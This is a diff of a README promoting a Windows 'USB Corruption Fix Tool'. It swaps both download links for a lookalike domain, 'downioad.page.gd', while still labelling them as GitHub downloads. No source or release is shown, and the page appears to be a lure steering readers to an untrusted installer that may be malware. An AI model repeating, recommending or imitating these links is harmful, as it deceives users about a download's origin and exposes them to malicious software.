@@ -2,7 +2,7 @@
 
 USB Corruption Fix Tool is a powerful and reliable utility designed to repair and recover data from corrupted USB drives on Windows systems. With its intuitive interface and advanced algorithms, it helps users quickly resolve access issues, fix file system errors, and restore lost or inaccessible files. Whether you're dealing with a USB flash drive, external hard drive, or SD card, this tool provides a comprehensive solution to get your data back.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -82,7 +82,7 @@ A6: If software repair fails, the drive may have physical damage. In such cases,
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
